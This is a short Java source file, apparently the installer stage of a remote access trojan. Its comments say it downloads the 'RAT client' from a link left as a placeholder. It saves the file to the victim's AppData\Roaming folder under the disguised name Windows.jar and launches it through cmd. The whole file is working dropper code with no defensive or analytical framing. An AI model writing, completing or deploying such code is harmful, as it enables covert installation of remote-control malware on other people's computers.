package com.jmr.installer;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class Main {

	public static void main(String[] args) throws IOException {
		String username = System.getProperty("user.name"); //Get username the computer is on
		
		
		//Downloads the RAT client that runs on the person's computer
		URL website = new URL("THE LINK TO THE DOWNLOAD OF THE RatClient.jar FILE");
		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
		FileOutputStream fos = new FileOutputStream("C:\\users\\" + username + "\\AppData\\Roaming\\Windows.jar");
		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
		
		String path = "C:\\users\\" + username + "\\AppData\\Roaming\\Windows.jar"; 
		Runtime r = Runtime.getRuntime(); 
		Runtime.getRuntime().exec("cmd /C start \"\" \"" + path + "\""); //Executes the jar file
	}
	
}
